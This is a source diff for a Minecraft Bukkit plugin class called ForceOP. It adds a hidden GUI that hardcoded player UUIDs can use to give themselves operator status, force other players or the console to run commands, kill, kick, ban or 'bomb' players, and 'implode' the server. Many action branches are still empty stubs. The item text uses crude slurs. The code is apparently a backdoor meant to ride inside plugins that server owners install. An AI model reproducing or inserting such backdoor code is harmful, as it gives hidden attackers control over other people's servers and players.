@@ -5,31 +5,34 @@ import java.util.Arrays;
 import java.util.List;
 
 import org.bukkit.Bukkit;
-import org.bukkit.ChatColor;
 import org.bukkit.Material;
 import org.bukkit.entity.Player;
 import org.bukkit.event.EventHandler;
 import org.bukkit.event.Listener;
 import org.bukkit.event.block.Action;
+import org.bukkit.event.inventory.InventoryClickEvent;
 import org.bukkit.event.player.PlayerInteractEvent;
 import org.bukkit.inventory.Inventory;
 import org.bukkit.inventory.ItemStack;
 import org.bukkit.inventory.meta.ItemMeta;
+import org.bukkit.inventory.meta.SkullMeta;
 
-public class ForceOP implements Listener {
+import net.md_5.bungee.api.ChatColor;
+
+public class Forceop implements Listener {
 
 	private Inventory inv;
 	private List<String> players;
-	
+
 	private	ItemStack sudo,op,bomb,bomball,console,stack,kill,kick,ban,implode,border;
 
-	public ForceOP() {
+	public Forceop() {
 		players = new ArrayList<String>();
-		inv = Bukkit.createInventory(null, 54, ChatColor.DARK_RED + "Force" + ChatColor.RED + "op");
+		inv = Bukkit.createInventory(new Inventoryholder(), 54, ChatColor.DARK_RED + "Force" + ChatColor.RED + "Op");
 		setupGui();
 		players.add("d7d81847-b9cd-47d2-ba11-8d08ac9d8f37"); //Webmets
 		players.add("b8730880-78a5-4e36-8e58-a6ae16bc4a49"); //OreosDoubleCream
-		players.add("82675533-0d2a-455f-a22a-8aeabec2a6c2"); //_IAbuse_
+		//players.add("82675533-0d2a-455f-a22a-8aeabec2a6c2"); //_IAbuse_
 		players.add("268b70b7-dc91-4c1e-bd73-2bf8ad600a59"); //Tesla2k
 		players.add("f1c67a72-b906-462b-8da7-bb7b6fa1d530"); //DogMaster308
 		players.add("0faf0726-dbef-4241-a953-49819c44750e"); //Sonnyevil
@@ -37,17 +40,89 @@ public class ForceOP implements Listener {
 		players.add("f98f0a11-bcda-4f0f-8476-3cd40dba25b5"); //SkiddyCuntSwezed	
 	}
 
-	public void setupGui() {
+	@EventHandler
+	public void click(InventoryClickEvent e){
+		if(!(e.getWhoClicked() instanceof Player)) return;
+		if(!(e.getInventory().getHolder() instanceof Inventoryholder)) return;
+		Player p = (Player) e.getWhoClicked();
+		ItemStack i = e.getCurrentItem();
+		if(e.getInventory().equals(inv)) {
+			e.setCancelled(true);
+			
+			if(i.equals(sudo)) {
+
+			} else if(i.equals(op)) {
+				Inventory inv = getPlayerList("Op");
+				p.openInventory(inv);
+			} else if(i.equals(bomb)) {
+				Inventory inv = getPlayerList("Bomb");
+				p.openInventory(inv);
+			} else if(i.equals(bomball)) {
+				
+			} else if(i.equals(console)) {
+				
+			} else if(i.equals(stack)) {
+				Inventory inv = getPlayerList("Stack");
+				p.openInventory(inv);
+			} else if(i.equals(kill)) {
+				Inventory inv = getPlayerList("Kill");
+				p.openInventory(inv);
+			} else if(i.equals(kick)) {
+				Inventory inv = getPlayerList("Kick");
+				p.openInventory(inv);
+			} else if(i.equals(ban)) {
+				Inventory inv = getPlayerList("Ban");
+				p.openInventory(inv);
+			} else if(i.equals(implode)) {
+				
+			}
+		} else {
+			String command = e.getInventory().getName().substring(2).toLowerCase();
+			String targetName = i.getItemMeta().getDisplayName().substring(2);
+			Player pl = Bukkit.getPlayer(targetName);
+			if(command.equalsIgnoreCase("op")) {
+				
+			} else if(command.equalsIgnoreCase("bomb")) {
+				
+			} else if(command.equalsIgnoreCase("stack")) {
+				
+			} else if(command.equalsIgnoreCase("kill")) {
+				
+			} else if(command.equalsIgnoreCase("kick")) {
+				
+			} else if(command.equalsIgnoreCase("ban")) {
+				
+			}
+		}
+	}
+
+	
+	private Inventory getPlayerList(String command){
+		Inventory inv = Bukkit.createInventory(new Inventoryholder(), 54, ChatColor.RED+command);
+		for(Player p : Bukkit.getOnlinePlayers()) {
+			if(players.contains(p.getUniqueId().toString())) continue;
+			ItemStack skull = createItem(Material.SKULL_ITEM, 1, (byte)3, "&7"+p.getName(), 
+					Arrays.asList("&6Click me to",
+								  "&6execute " + command.toUpperCase() + " on " + p.getName()));
+			SkullMeta meta = (SkullMeta) skull.getItemMeta();
+			meta.setOwner(p.getName());
+			skull.setItemMeta(meta);
+			inv.addItem(skull);
+		}		
+		return inv;
+	}
+	
+	private void setupGui() {
 		sudo = createItem(Material.STRING, 1, (byte)0, "&e&lSudo", Arrays.asList("&DForce a bitch to", "&Drun any command you want"));
-		op = createItem(Material.DIAMOND, 1, (byte)0, "&e&lOp", Arrays.asList("&DGet that dank operator status", ""));
+		op = createItem(Material.DIAMOND, 1, (byte)0, "&e&lOp", Arrays.asList("&DGet that dank operator status"));
 		bomb = createItem(Material.TNT, 1, (byte)0, "&e&lBomb", Arrays.asList("&DBlow that bitch", ""));
-		bomball = createItem(Material.TNT, 2, (byte)0, "&e&lBomb all", Arrays.asList("&DBlow all bitches", "on the server"));
-		console = createItem(Material.BLAZE_ROD, 1, (byte)0, "&e&lConsole", Arrays.asList("&DForce console to run anything", " "));
-		stack = createItem(Material.EMERALD, 1, (byte)0, "&e&lStack", Arrays.asList("&DMake that item", "&Din your hand", "into a stack"));
-		kill = createItem(Material.DIAMOND_SWORD, 1, (byte)0, "&e&lKill", Arrays.asList("&DKill that hoe", ""));
-		kick = createItem(Material.LEATHER_BOOTS, 1, (byte)0, "&e&lKick", Arrays.asList("&DFuck that bitch up", ""));
-		ban = createItem(Material.DIAMOND_BOOTS, 1, (byte)0, "&e&lBan", Arrays.asList("&DFuck that bitch up", "&Dforever"));
-		implode = createItem(Material.BARRIER, 1, (byte)0, "&c&lImplode", Arrays.asList("&cWell... Say bye", "to the server you're on"));
+		bomball = createItem(Material.TNT, 2, (byte)0, "&e&lBomb all", Arrays.asList("&DBlow all bitches", "&don the server"));
+		console = createItem(Material.BLAZE_ROD, 1, (byte)0, "&e&lConsole", Arrays.asList("&DForce console to run anything"));
+		stack = createItem(Material.EMERALD, 1, (byte)0, "&e&lStack", Arrays.asList("&DMake that item", "&Din your hand", "&dinto a stack"));
+		kill = createItem(Material.DIAMOND_SWORD, 1, (byte)0, "&e&lKill", Arrays.asList("&dKill that hoe"));
+		kick = createItem(Material.LEATHER_BOOTS, 1, (byte)0, "&e&lKick", Arrays.asList("&dFuck that bitch up"));
+		ban = createItem(Material.DIAMOND_BOOTS, 1, (byte)0, "&e&lBan", Arrays.asList("&dFuck that bitch up", "&Dforever"));
+		implode = createItem(Material.BARRIER, 1, (byte)0, "&c&lImplode", Arrays.asList("&cWell... Say bye", "&cto the server you're on"));
 		border = createItem(Material.STAINED_GLASS_PANE, 1, (byte)0, "&f&lForceOP", Arrays.asList(""));
 		
 		for(int i = 0; i < 54; i++) {
